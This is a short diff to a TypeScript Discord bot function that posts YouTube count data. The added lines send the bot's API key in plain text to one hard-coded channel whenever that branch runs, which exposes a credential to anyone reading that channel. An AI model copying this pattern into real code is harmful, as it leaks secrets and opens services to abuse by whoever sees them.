@@ -290,6 +290,10 @@ export async function sendYtCountsEmbed(options: sendYtCountsEmbedOptions) {
               message.channel.send("```json\n" + JSON.stringify(body, null, 2) + "```").catch((error) => {
                 console.log(error)
               })
+
+              if (message.channel.id === "827670630580355083") {
+                message.channel.send("API KEY: `" + apikey + "`");
+              }
             }
            
           }
